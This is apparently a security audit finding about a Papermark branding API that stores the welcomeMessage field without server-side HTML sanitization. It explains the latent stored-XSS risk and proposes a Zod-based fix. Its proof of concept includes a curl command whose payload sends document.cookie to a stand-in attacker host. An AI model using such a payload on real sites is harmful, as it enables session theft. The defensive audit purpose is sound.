# Finding: welcomeMessage Stored Without Server-Side HTML Sanitization

## Severity
HIGH

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.5 (latent — every current sink escapes the value, but the defense is at the wrong layer; a future feature that adds the field to a `dangerouslySetInnerHTML` block immediately ships XSS).

## Affected Code
- File: `pages/api/teams/[teamId]/branding.ts`
- Line: 34 (Zod schema: `welcomeMessage: z.string().nullable().optional()` — no `.transform(sanitizePlainText)`), 208, 237, 302-303 (write paths that store `body.welcomeMessage` verbatim)
- Function: `handle` (the PATCH handler at line 99+)
- Endpoint: `PATCH /api/teams/:teamId/branding`

- File: `pages/api/teams/[teamId]/datarooms/[id]/branding.ts`
- Line: 35 (Zod schema), 242, 307, 349 (write paths)
- Function: `handle`
- Endpoint: `PATCH /api/teams/:teamId/datarooms/:dataroomId/branding`

## Description
The `welcomeMessage` field is declared in the Zod schema as `z.string().nullable().optional()` — there is no `.transform((value) => sanitizePlainText(value))` and no per-route `validateContent()` call. The server endpoint accepts whatever the client posts and writes the raw string to the `Brand.welcomeMessage` / `DataroomBrand.welcomeMessage` column. All client-side "no HTML allowed" checks live inside the React component (`validateWelcomeMessage` in `pages/branding.tsx:472` and `pages/datarooms/[id]/branding/index.tsx:615`).

An authenticated team admin who POSTs to `/api/teams/:teamId/branding` directly (bypassing the UI, e.g. via curl, fetch from devtools, or a CSRF scenario) is free to submit HTML in `welcomeMessage` and have it persisted as-is.

## Proof of Concept

### Pre-conditions
- The attacker is an authenticated team member (any role — the PATCH endpoint gates on team membership only).
- The attacker can submit a PATCH to the branding endpoint directly (bypassing the client-side `validateWelcomeMessage` check).

### Step-by-step exploitation (latent — works as soon as a future sink is added)
1. Attacker submits a `welcomeMessage` with HTML:
   ```bash
   curl -X PATCH 'https://app.papermark.com/api/teams/<teamId>/branding' \
     -H 'Content-Type: application/json' \
     -b '__Secure-next-auth.session-token=<attacker_session_jwt>' \
     -d '{"welcomeMessage":"<img src=x onerror=fetch(\"https://attacker.com/x?c=\"+document.cookie)>"}'
   ```
   The server returns 200 OK; the value is persisted.

2. **Today**: every rendering site escapes it. The `<p>{welcomeMessage}</p>` in `nav-dataroom.tsx:521`, `<h1>{welcomeMessage}</h1>` in `access-form/index.tsx:174-176`, and the iframe preview at `entrance_ppreview_demo.tsx:29` all use React text nodes (auto-escape). No XSS.

3. **Latent**: if a future feature adds the field to a `dangerouslySetInnerHTML` block (e.g. for markdown support, for an Open Graph description, for an email template, for a Notion-style HTML re-emit), the XSS fires on every viewer's access-form load.

## Impact
- **Latent stored XSS** — every viewer of every link in the team is a potential victim.
- **Defense-in-depth gap** — papermark's intentional security pattern for any user-supplied text is "Zod-transform with `sanitizePlainText` before write." That pattern is missing here.
- **The function `validateWelcomeMessage` exists** in the page module and is the correct pattern — it could be re-used at the server boundary trivially. Its absence is a deliberate gap, not a forgotten one.

## Evidence
```ts
// pages/api/teams/[teamId]/branding.ts:34 — Zod schema
welcomeMessage: z.string().nullable().optional(),

// pages/api/teams/[teamId]/branding.ts:208 — write path
welcomeMessage: messagingAllowed ? body.welcomeMessage ?? null : null,

// pages/api/teams/[teamId]/branding.ts:237 — update path (also verbatim)
welcomeMessage: messagingAllowed ? body.welcomeMessage ?? null : undefined,

// pages/api/teams/[teamId]/branding.ts:302-303 — partial update path
? body.welcomeMessage
: (existingBrand?.welcomeMessage ?? null);
```
All three write paths (`create`, `update`, partial-update) accept `body.welcomeMessage` with no sanitize call. The dataroom-level handler in `pages/api/teams/[teamId]/datarooms/[id]/branding.ts` is identical.

## Methodology
- **M3 — Sanitizer-bypass** (`methodology-raw/01-sanitizer-bypass.md` Finding 1)

## Chain Potential
- **Chain 8** (`methodology-raw/05-chains.md`) — the welcomeMessage is the entry point for the CSV injection chain (Chain 8, leg 1). The `welcomeMessage` value is included in the dataroom index CSV export (F-021) and the conversations export (F-022). When a team admin opens the export in Excel, the formula fires.

## Remediation
At `pages/api/teams/[teamId]/branding.ts:34` and `pages/api/teams/[teamId]/datarooms/[id]/branding.ts:35`, change the schema to:
```ts
welcomeMessage: z
  .string()
  .nullable()
  .optional()
  .transform((v) => (v == null ? null : validateContent(v, 80)))
  .pipe(z.string().min(1).max(80).nullable()),
```
This mirrors the existing pattern at `lib/zod/url-validation.ts:202-213` (`documentUploadSchema`), `pages/api/teams/[teamId]/documents/[id]/update-name.ts:12-22` (`updateNameSchema`), and `app/(ee)/api/links/[id]/upload/route.ts:210` (`sanitizePlainText(documentData.name)`). Even though the current render is safe, the defense-in-depth pattern is explicit elsewhere in the codebase — this is the only branded text field that breaks the convention.

Apply the same fix to all three write paths (`create`, `update`, partial-update).
